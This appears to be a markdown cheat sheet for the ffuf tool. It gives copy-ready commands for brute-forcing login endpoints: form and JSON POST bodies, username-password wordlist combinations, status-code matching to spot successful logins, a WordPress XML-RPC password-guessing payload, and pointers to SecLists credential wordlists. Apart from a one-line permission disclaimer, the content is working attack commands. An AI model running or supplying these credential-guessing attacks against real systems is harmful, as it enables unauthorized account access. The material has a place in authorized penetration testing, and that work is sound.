# 🛠️ FFUF POST Request Brute-Force Cheat Sheet

## 🔍 Tool: [ffuf (Fuzz Faster U Fool)](https://github.com/ffuf/ffuf)

---

## 📤 Basic POST Request Fuzzing

```bash
ffuf -u https://target.com/login -X POST -d "username=admin&password=FUZZ" -w /path/to/wordlist.txt -H "Content-Type: application/x-www-form-urlencoded"
```

### 🔎 Explanation

- `-u`: Target URL.
- `-X POST`: Use **POST** method.
- `-d`: POST data, with `FUZZ` as the **injection point**.
- `-w`: Path to your **wordlist**.
- `-H`: Set headers (usually required for form submissions).

---

## 🔁 Fuzzing Multiple Parameters (e.g., username and password)

```bash
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=FUZ2Z" -w users.txt:FUZZ -w passwords.txt:FUZ2Z -H "Content-Type: application/x-www-form-urlencoded"
```

### 🔎 Explanation

- **Two wordlists** for different fuzzing points: `FUZZ` and `FUZ2Z`.
- Useful for brute-forcing **username-password** combinations.

---

## 🔁 JSON POST Body Fuzzing

```bash
ffuf -u https://target.com/api/login -X POST -d '{"user":"admin", "pass":"FUZZ"}' -H "Content-Type: application/json" -w /path/to/wordlist.txt
```

### 🔎 Explanation

- Use `-H "Content-Type: application/json"` to match API expectations.
- JSON bodies require quotes and proper escaping.

---

## 📥 Match or Filter by Response Code

```bash
ffuf -u https://target.com/login -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /path/to/wordlist.txt -mc 200
```

### 🔎 Explanation

- `-mc 200`: Match **only HTTP 200 responses** (likely successful logins).
- Use `-fc` to **filter out** common responses (e.g., 403, 401).

---

## 🧠 Bonus Tips

- Use `-t 100` to increase threads for faster fuzzing (use with caution).
- Use `-o results.txt` to save output.
- Add `-fs <size>` to filter responses by size if success gives different content length.
- Include cookies or tokens with `-H "Cookie: session=abc123"` if required.

---

## 🛠️ Example Use Case: WordPress XML-RPC Brute-force

```bash
ffuf -X POST -u http://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>FUZZ</string></value></param></params></methodCall>' -H "Content-Type: text/xml" -w passwords.txt -mc 200
```

---

📚 **Recommended Wordlists**:
- `SecLists`: [`https://github.com/danielmiessler/SecLists`](https://github.com/danielmiessler/SecLists)
  - `SecLists/Passwords/Common-Credentials/10k-most-common.txt`
  - `SecLists/Usernames/top-usernames-shortlist.txt`

---

🧪 Always test with a known working login (if available) to verify response patterns before brute-forcing.

> ⚠️ Use responsibly. Only test systems you have permission to audit.
